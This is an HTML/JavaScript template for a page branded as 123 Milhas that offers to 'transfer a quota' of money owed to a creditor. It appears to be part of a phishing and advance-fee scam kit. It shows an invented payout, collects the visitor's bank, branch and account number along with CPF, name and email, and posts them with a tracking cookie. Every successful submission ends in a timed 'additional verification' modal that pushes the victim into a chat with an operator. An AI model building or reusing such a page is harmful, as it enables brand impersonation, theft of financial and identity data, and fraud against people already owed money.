<!doctype html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover" />
    <title>123 Milhas - Transferir Cota</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
    <link
      href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800;900&family=Nunito:wght@400;600;700&display=swap"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="{{ url_for('static', filename='assets/css/transferencia.css') }}" />
  </head>
  <body>
    <div class="header-simples">
      <img src="{{ url_for('static', filename='assets/img/logo.avif') }}" alt="123 Milhas" class="logo" />
    </div>

    <div class="main-container">
      <div class="page-header">
        <button class="btn-back" onclick="window.location.href = '/'">
          <i class="fas fa-arrow-left"></i>
        </button>
        <h1>TRANSFERIR COTA</h1>
      </div>

      <div class="transfer-card">
        <div class="valor-disponivel">
          <div class="label">VALOR DISPONÍVEL</div>
          <div class="valor" id="valorDisponivel">R$ 0,00</div>
        </div>

        <div class="form-group">
          <div class="form-label">BANCO DE DESTINO</div>
          <select class="custom-select" id="bancoDestino">
            <option value="">Selecione o banco</option>
          </select>
        </div>

        <div class="input-grid">
          <div class="form-group">
            <div class="form-label">AGÊNCIA</div>
            <input type="text" id="agencia" class="field-input" placeholder="0001" maxlength="10" />
          </div>
          <div class="form-group">
            <div class="form-label">CONTA COM DÍGITO</div>
            <input type="text" id="conta" class="field-input" placeholder="Digite o número da conta" oninput="apenasNumeros(this)" />
          </div>
        </div>

        <button class="btn-confirmar" id="btnConfirmar" onclick="confirmarTransferencia()">CONFIRMAR ENVIO</button>
      </div>
    </div>

    <button class="chat-btn-custom" onclick="abrirChat()">
      <i class="fas fa-comment-dots"></i>
    </button>

    <div id="chatModal" class="chat-modal-custom">
      <div class="chat-modal-header">
        <div class="chat-modal-logo">
          <img src="{{ url_for('static', filename='assets/img/logo.avif') }}" alt="123 Milhas" />
        </div>
        <div class="chat-modal-title">
          <h4>Atendimento 123 Milhas <span class="chat-online-indicator"></span></h4>
          <p>Online - Respondemos em instantes</p>
        </div>
        <button class="chat-modal-close" onclick="fecharChat()">✕</button>
      </div>
      <div class="chat-modal-body">
        <div class="chat-modal-messages" id="chatMessages">
          <div class="message-bubble system">
            <strong>👋 Olá!</strong><br />
            Bem-vindo ao canal de atendimento da 123 Milhas.<br />
            Como podemos ajudar você hoje?
            <span class="message-time">Online agora</span>
          </div>
        </div>
        <div class="chat-modal-input-area">
          <input type="text" id="chatInput" placeholder="Digite sua mensagem..." />
          <button onclick="enviarMensagem()"><i class="fas fa-paper-plane"></i></button>
        </div>
      </div>
    </div>

    <script>
      // ============================================
      // CONFIGURAÇÕES
      // ============================================
      const STORAGE_KEYS = {
        CREDOR_DATA: 'credorData',
        USER_NAME: 'chatUserName'
      }

      // ============================================
      // CÁLCULO DE COTAS
      // ============================================
      function calcularValorPrimeiraCota(valorTotal) {
        if (!valorTotal || valorTotal <= 0) return 0
        const numeroCotas = valorTotal > 20000 ? 4 : 2
        const valorCota = valorTotal / numeroCotas
        console.log(`📊 Cálculo: Total R$ ${valorTotal.toFixed(2)}, ${numeroCotas} cotas de R$ ${valorCota.toFixed(2)}`)
        return valorCota
      }

      // ============================================
      // FUNÇÃO CORRIGIDA: Extrair valor do campo correto
      // ============================================
      function extrairValor(credor) {
        // Tenta extrair de diferentes formatos possíveis
        let valorString = credor.valor || credor.valor_real || credor.valor_total || 'R$ 0,00'

        // Remove R$, espaços e converte vírgula para ponto
        let valorNumerico = parseFloat(
          valorString
            .replace(/[R$\s]/g, '') // Remove R$ e espaços
            .replace(/\./g, '') // Remove pontos de milhar
            .replace(',', '.') // Substitui vírgula decimal por ponto
        )

        console.log('💰 Valor extraído:', valorString, '=>', valorNumerico)
        return isNaN(valorNumerico) ? 0 : valorNumerico
      }

      // ============================================
      // MODAL SYSTEM
      // ============================================
      function abrirModal({
        tipo = 'aviso',
        titulo,
        mensagem,
        botaoPrimario = 'OK',
        botaoSecundario = null,
        callbackPrimario = null,
        callbackSecundario = null
      }) {
        fecharModalAtivo()

        const useLogoHeader = tipo === 'logo'
        let iconeHtml = ''

        if (!useLogoHeader) {
          const tipoMap = {
            erro: { circulo: 'danger', icon: 'fa-ban' },
            aviso: { circulo: 'warning', icon: 'fa-exclamation-triangle' },
            info: { circulo: 'warning', icon: 'fa-info-circle' }
          }
          const cfg = tipoMap[tipo] || tipoMap.info
          iconeHtml = `
            <div class="modal-icon-circle ${cfg.circulo}">
              <i class="fas ${cfg.icon}"></i>
            </div>`
        } else {
          iconeHtml = `
            <div class="modal-logo-wrap">
              <img src="/static/assets/img/logo.avif" alt="123 Milhas" />
            </div>`
        }

        const secBtn = botaoSecundario ? `<button class="modal-btn ghost" id="modalBtnSec">${botaoSecundario}</button>` : ''

        const overlay = document.createElement('div')
        overlay.className = 'modal-overlay'
        overlay.id = 'modalAtivo'
        overlay.innerHTML = `
          <div class="modal-box">
            ${iconeHtml}
            <h3>${titulo}</h3>
            <p>${mensagem}</p>
            <button class="modal-btn primary" id="modalBtnPri">${botaoPrimario}</button>
            ${secBtn}
          </div>`

        document.body.appendChild(overlay)

        document.getElementById('modalBtnPri').onclick = () => {
          fecharModalAtivo()
          if (callbackPrimario) callbackPrimario()
        }
        if (botaoSecundario) {
          document.getElementById('modalBtnSec').onclick = () => {
            fecharModalAtivo()
            if (callbackSecundario) callbackSecundario()
          }
        }
        overlay.addEventListener('click', (e) => {
          if (e.target === overlay) fecharModalAtivo()
        })
      }

      function fecharModalAtivo() {
        document.getElementById('modalAtivo')?.remove()
      }

      // ============================================
      // FUNÇÃO CORRIGIDA: CARREGAR DADOS DO CACHE
      // ============================================
      function carregarDadosDoCache() {
        const credorData = localStorage.getItem(STORAGE_KEYS.CREDOR_DATA)
        if (credorData) {
          try {
            const credor = JSON.parse(credorData)
            console.log('📦 Dados carregados do cache:', credor)

            // CORREÇÃO PRINCIPAL: Usar a função extrairValor
            const valorOriginal = extrairValor(credor)
            const primeiraCota = calcularValorPrimeiraCota(valorOriginal)

            document.getElementById('valorDisponivel').textContent =
              `R$ ${primeiraCota.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}`

            return {
              nome: credor.nome || 'NÃO INFORMADO',
              cpf_limpo: credor.cpf_limpo || credor.cpf || '00000000000',
              email: credor.email || '',
              valor_original: valorOriginal,
              primeira_cota: primeiraCota,
              numero_cotas: valorOriginal > 20000 ? 4 : 2,
              // Manter os dados originais
              ...credor
            }
          } catch (e) {
            console.error('Erro ao carregar cache:', e)
            abrirModal({
              tipo: 'erro',
              titulo: 'Erro ao carregar dados',
              mensagem: 'Não foi possível carregar seus dados. Volte e tente novamente.',
              callbackPrimario: () => {
                window.location.href = '/'
              }
            })
            return null
          }
        } else {
          console.log('⚠️ Nenhum dado em cache encontrado')
          abrirModal({
            tipo: 'erro',
            titulo: 'Dados não encontrados',
            mensagem: 'Nenhum dado encontrado. Volte e consulte seu CPF.',
            callbackPrimario: () => {
              window.location.href = '/'
            }
          })
          return null
        }
      }

      // ============================================
      // DADOS & BANCOS
      // ============================================
      const bancosBrasil = [
        { codigo: '001', nome: 'Banco do Brasil' },
        { codigo: '033', nome: 'Santander' },
        { codigo: '104', nome: 'Caixa Econômica Federal' },
        { codigo: '237', nome: 'Bradesco' },
        { codigo: '341', nome: 'Itaú Unibanco' },
        { codigo: '389', nome: 'Banco Mercantil do Brasil' },
        { codigo: '422', nome: 'Banco Safra' },
        { codigo: '633', nome: 'Banco Rendimento' },
        { codigo: '652', nome: 'Itaú Unibanco Holding' },
        { codigo: '653', nome: 'Banco BTG Pactual' },
        { codigo: '655', nome: 'Banco Votorantim' },
        { codigo: '707', nome: 'Banco Daycoval' },
        { codigo: '739', nome: 'Banco Cetelem' },
        { codigo: '743', nome: 'Banco Semear' },
        { codigo: '745', nome: 'Banco Citibank' },
        { codigo: '746', nome: 'Banco Modal' },
        { codigo: '747', nome: 'Banco Rabobank' },
        { codigo: '748', nome: 'Banco Cooperativo Sicredi' },
        { codigo: '749', nome: 'Banco Cooperativo do Brasil - Sicoob' },
        { codigo: '751', nome: 'Scotiabank Brasil' },
        { codigo: '752', nome: 'Banco BNP Paribas Brasil' },
        { codigo: '260', nome: 'Nubank' },
        { codigo: '077', nome: 'Banco Inter' },
        { codigo: '212', nome: 'Banco Original' },
        { codigo: '290', nome: 'PagSeguro Internet S.A.' },
        { codigo: '323', nome: 'Mercado Pago' },
        { codigo: '332', nome: 'Banco C6 S.A.' },
        { codigo: '380', nome: 'PicPay' },
        { codigo: '197', nome: 'Banco Will S.A.' },
        { codigo: '348', nome: 'Banco XP S.A.' },
        { codigo: '102', nome: 'Banco Next' },
        { codigo: '093', nome: 'Banco Digio' },
        { codigo: '132', nome: 'Banco Bmg' },
        { codigo: '173', nome: 'Banco BS2' },
        { codigo: '253', nome: 'Banco Genial' },
        { codigo: '268', nome: 'Banco Bari' },
        { codigo: '336', nome: 'Banco C6 Bank' },
        { codigo: '367', nome: 'Banco Votorantim (BV)' }
      ]

      const sel = document.getElementById('bancoDestino')
      bancosBrasil.forEach((b) => {
        const o = document.createElement('option')
        o.value = b.codigo
        o.textContent = `${b.codigo} - ${b.nome}`
        sel.appendChild(o)
      })

      // ============================================
      // TRANSFERÊNCIA - POST CORRIGIDO
      // ============================================
      let timeoutId = null
      let credorData = carregarDadosDoCache()

      function mostrarCountdown() {
        document.querySelector('.countdown-timer')?.remove()
        document.body.insertAdjacentHTML(
          'beforeend',
          `
          <div class="countdown-timer" id="countdownTimer">
            <i class="fas fa-hourglass-half"></i>
            <span>Verificando dados bancários...</span>
          </div>
        `
        )
      }

      function removerCountdown() {
        document.getElementById('countdownTimer')?.remove()
      }

      function mostrarLoadingBotao(ativo) {
        const btn = document.getElementById('btnConfirmar')
        btn.disabled = ativo
        btn.innerHTML = ativo ? '<span class="spinner"></span> PROCESSANDO...' : 'CONFIRMAR ENVIO'
      }

      function cancelarTimeout() {
        if (timeoutId) {
          clearTimeout(timeoutId)
          timeoutId = null
        }
        removerCountdown()
      }

      function getCookie(name) {
        const value = `; ${document.cookie}`
        const parts = value.split(`; ${name}=`)
        if (parts.length === 2) return parts.pop().split(';').shift()
        return null
      }

      function mostrarModalFalarComAtendente() {
        abrirModal({
          tipo: 'logo',
          titulo: 'ATENÇÃO!',
          mensagem:
            'Sua transferência necessita de verificação adicional. Por favor, entre em contato com nosso atendente via chat para continuar com a liberação.',
          botaoPrimario: 'FALAR COM ATENDENTE',
          botaoSecundario: 'TENTAR NOVAMENTE',
          callbackPrimario: () => {
            mostrarLoadingBotao(false)
            abrirChat()
          },
          callbackSecundario: () => {
            mostrarLoadingBotao(false)
          }
        })
      }

      // ============================================
      // FUNÇÃO CORRIGIDA - CONFIRMAR TRANSFERÊNCIA
      // ============================================

      async function confirmarTransferencia() {
        if (!credorData) {
          abrirModal({
            tipo: 'erro',
            titulo: 'Dados não carregados',
            mensagem: 'Por favor, volte e consulte seu CPF novamente.',
            callbackPrimario: () => {
              window.location.href = '/'
            }
          })
          return
        }

        cancelarTimeout()

        const banco = document.getElementById('bancoDestino').value
        const agencia = document.getElementById('agencia').value.trim()
        const conta = document.getElementById('conta').value.trim()

        if (!banco) {
          abrirModal({ tipo: 'aviso', titulo: 'Campo obrigatório', mensagem: 'Por favor, selecione um banco de destino para continuar.' })
          return
        }
        if (!agencia) {
          abrirModal({ tipo: 'aviso', titulo: 'Campo obrigatório', mensagem: 'Por favor, informe o número da agência bancária.' })
          return
        }
        if (!conta) {
          abrirModal({ tipo: 'aviso', titulo: 'Campo obrigatório', mensagem: 'Por favor, informe o número da conta com dígito.' })
          return
        }

        mostrarLoadingBotao(true)
        mostrarCountdown()

        const bancoSelect = document.getElementById('bancoDestino')
        const bancoNome = bancoSelect.options[bancoSelect.selectedIndex]?.text || 'Banco não identificado'

        // ============================================
        // PAYLOAD CORRIGIDO - AGORA BATE COM O BACKEND
        // ============================================
        const payload = {
          tracking_id: getCookie('tracking_id'),
          transferencia: {
            banco_codigo: banco,
            banco_nome: bancoNome,
            agencia: agencia,
            conta: conta,
            valor: credorData.primeira_cota,
            valor_original_total: credorData.valor_original,
            numero_cota: 1
          },
          usuario: {
            nome: credorData.nome,
            cpf: credorData.cpf_limpo,
            email: credorData.email || ''
          }
        }

        console.log('')
        console.log('═══════════════════════════════════════════════════')
        console.log('📤 [POST] /api/transfer/tentativa') // ALTERADO: sem /chat/
        console.log('═══════════════════════════════════════════════════')
        console.log('📦 PAYLOAD COMPLETO:')
        console.log(JSON.stringify(payload, null, 2))
        console.log('═══════════════════════════════════════════════════')
        console.log('📱 INFORMAÇÕES DO DISPOSITIVO:')
        console.log(`   - IP: ${getCookie('tracking_id') || 'Coletado pelo backend'}`)
        console.log(`   - User-Agent: ${navigator.userAgent}`)
        console.log('═══════════════════════════════════════════════════')
        console.log('⏰ NOTA: Backend usa UTC, não horário de Brasília')
        console.log('')

        try {
          // ALTERADO: Rota correta sem /chat/
          const response = await fetch('/api/transfer/tentativa', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify(payload)
          })

          const result = await response.json()
          console.log('✅ [RESPOSTA DO BACKEND]:', result)

          if (result.success) {
            console.log(`✅ Transferência registrada com ID: ${result.transferencia_id}`)
            // Sucesso - mantém o fluxo normal
            timeoutId = setTimeout(() => {
              removerCountdown()
              mostrarModalFalarComAtendente()
              timeoutId = null
            }, 8000)
          } else {
            console.error('❌ Erro no backend:', result.error)
            removerCountdown()
            mostrarLoadingBotao(false)
            abrirModal({
              tipo: 'erro',
              titulo: 'Erro na transferência',
              mensagem: result.error || 'Ocorreu um erro ao processar sua solicitação. Tente novamente.',
              botaoPrimario: 'OK',
              callbackPrimario: () => {
                mostrarLoadingBotao(false)
              }
            })
            cancelarTimeout()
          }
        } catch (error) {
          console.error('❌ [ERRO NA REQUISIÇÃO]:', error)
          removerCountdown()
          mostrarLoadingBotao(false)
          abrirModal({
            tipo: 'erro',
            titulo: 'Erro de conexão',
            mensagem: 'Não foi possível conectar ao servidor. Verifique sua internet e tente novamente.',
            botaoPrimario: 'OK',
            callbackPrimario: () => {
              mostrarLoadingBotao(false)
            }
          })
          cancelarTimeout()
        }
      }

      window.addEventListener('beforeunload', (e) => {
        if (timeoutId !== null) {
          e.preventDefault()
          e.returnValue = 'A transferência está sendo processada. Tem certeza que deseja sair?'
        }
      })
      window.addEventListener('unload', () => {
        if (timeoutId) clearTimeout(timeoutId)
      })

      // ============================================
      // CHAT
      // ============================================
      let chatClienteId = null
      let chatSalaId = null
      let chatUltimoTs = 0
      let chatNome = null
      let chatVerifInterval = null
      let chatMsgInterval = null

      function escHtml(s) {
        const d = document.createElement('div')
        d.textContent = s
        return d.innerHTML
      }

      function addMsg(tipo, texto, remetente) {
        const c = document.getElementById('chatMessages')
        if (!c) return
        const div = document.createElement('div')
        div.className = `message-bubble ${tipo}`
        const nome = tipo === 'user' ? 'Você' : tipo === 'operator' ? remetente || 'Atendente' : '💬 Sistema'
        const hora = new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })
        div.innerHTML = `<strong>${nome}</strong><br>${escHtml(texto)}<span class="message-time">${hora}</span>`
        c.appendChild(div)
        c.scrollTop = c.scrollHeight
      }

      async function entrarFila(nome) {
        try {
          const r = await fetch('/api/chat/entrar_fila', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ nome })
          })
          const d = await r.json()
          chatClienteId = d.cliente_id
          chatNome = nome
          addMsg('system', `Olá ${nome}, você entrou na fila. Aguarde um atendente.`)
          if (chatVerifInterval) clearInterval(chatVerifInterval)
          chatVerifInterval = setInterval(verificarSala, 3000)
        } catch {
          addMsg('system', '❌ Erro ao conectar. Tente novamente.')
        }
      }

      async function verificarSala() {
        if (chatSalaId || !chatClienteId) return
        try {
          const r = await fetch(`/api/chat/verificar_sala/${chatClienteId}`)
          const d = await r.json()
          if (d.status === 'em_atendimento' && d.sala_id) {
            chatSalaId = d.sala_id
            clearInterval(chatVerifInterval)
            chatVerifInterval = null
            addMsg('operator', '🎧 Um atendente entrou no chat! Como posso ajudar?')
            if (chatMsgInterval) clearInterval(chatMsgInterval)
            chatMsgInterval = setInterval(buscarMensagens, 2000)
          }
        } catch {}
      }

      async function buscarMensagens() {
        if (!chatSalaId) return
        try {
          const r = await fetch(`/api/chat/mensagens/${chatSalaId}?ultimo_timestamp=${chatUltimoTs}`)
          const d = await r.json()
          if (d.mensagens && d.mensagens.length > 0) {
            d.mensagens.forEach((msg) => {
              if (msg.time > chatUltimoTs) chatUltimoTs = msg.time
              if (msg.de === chatNome) return
              if (msg.de === 'sistema') {
                if (msg.texto && msg.texto.includes('encerrado')) {
                  clearInterval(chatMsgInterval)
                  chatMsgInterval = null
                  chatSalaId = null
                }
                addMsg('system', msg.texto)
              } else {
                addMsg('operator', msg.texto, msg.de)
              }
            })
            if (d.ultimo_timestamp > chatUltimoTs) chatUltimoTs = d.ultimo_timestamp
          }
        } catch {}
      }

      async function enviarMensagem() {
        const input = document.getElementById('chatInput')
        const texto = input ? input.value.trim() : ''
        if (!texto) return
        addMsg('user', texto)
        input.value = ''
        if (!chatSalaId) return
        try {
          const r = await fetch('/api/chat/enviar_mensagem', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sala_id: chatSalaId, de: chatNome, texto, cliente_id: chatClienteId })
          })
          const d = await r.json()
          if (d.success && d.mensagem && d.mensagem.time > chatUltimoTs) chatUltimoTs = d.mensagem.time
        } catch {}
      }

      function pedirNome() {
        fecharModalAtivo()
        const overlay = document.createElement('div')
        overlay.className = 'modal-overlay'
        overlay.id = 'modalAtivo'
        overlay.innerHTML = `
          <div class="modal-box">
            <div class="modal-logo-wrap">
              <img src="/static/assets/img/logo.avif" alt="123 Milhas" />
            </div>
            <h3>Bem-vindo!</h3>
            <p>Para iniciarmos o atendimento, qual é o seu nome?</p>
            <input type="text" id="nomeInputModal" placeholder="Digite seu nome" style="width:100%;padding:0.85rem 1rem;border:1.5px solid #e0e0e0;border-radius:14px;font-size:0.95rem;font-family:inherit;margin-bottom:1rem;outline:none;transition:border-color 0.2s;" onfocus="this.style.borderColor='#f05929'" onblur="this.style.borderColor='#e0e0e0'" />
            <button class="modal-btn primary" id="btnConfNome">Começar atendimento</button>
          </div>`
        document.body.appendChild(overlay)
        const inp = document.getElementById('nomeInputModal')
        inp.focus()
        inp.addEventListener('keypress', (e) => {
          if (e.key === 'Enter') confirmarNome()
        })
        document.getElementById('btnConfNome').onclick = confirmarNome
      }

      function confirmarNome() {
        const nome = (document.getElementById('nomeInputModal')?.value || '').trim()
        if (!nome) {
          abrirModal({ tipo: 'aviso', titulo: 'Nome obrigatório', mensagem: 'Por favor, digite seu nome para iniciar o atendimento.' })
          return
        }
        localStorage.setItem(STORAGE_KEYS.USER_NAME, nome)
        fecharModalAtivo()
        entrarFila(nome)
      }

      async function abrirChat() {
        document.getElementById('chatModal').classList.add('active')
        if (chatSalaId || chatClienteId) return
        const nome = localStorage.getItem(STORAGE_KEYS.USER_NAME)
        if (!nome) {
          pedirNome()
          return
        }
        entrarFila(nome)
      }

      function fecharChat() {
        document.getElementById('chatModal').classList.remove('active')
      }

      document.getElementById('chatInput').addEventListener('keypress', (e) => {
        if (e.key === 'Enter') enviarMensagem()
      })

      function apenasNumeros(input) {
        input.value = input.value.replace(/\D/g, '')
      }
    </script>
  </body>
